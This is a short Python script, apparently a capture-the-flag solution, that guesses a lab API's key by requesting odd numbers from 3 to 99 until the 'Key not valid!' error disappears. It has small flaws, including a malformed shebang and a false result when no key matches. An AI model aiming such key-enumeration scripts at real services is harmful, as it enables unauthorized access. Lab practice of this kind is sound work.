#!/bin/bash/python3
import os
import requests


# Create base variables.
machine_ip = os.getenv('IP', 'No IP provided')
port = "8000"
base_url = f"http://{machine_ip}:{port}/api/"


# Given the prompt, "odd number between 0-100", going to create a list of API keys to try.
keys_to_try = list()
for i in range(3, 100, 2):
	keys_to_try.append(i)


# Attempt to gain access to the API by trying each API key in keys_to_try.
# Example of no access: {"item_id":1,"q":"Error. Key not valid!"}
api_key = keys_to_try[0]
for key in keys_to_try:
	r = requests.get(base_url + str(key)).json()
	if 'Key not valid!' not in r.get('q'):
		api_key = key
		break


# Print the result!
print(f"The API key found is: {api_key}")
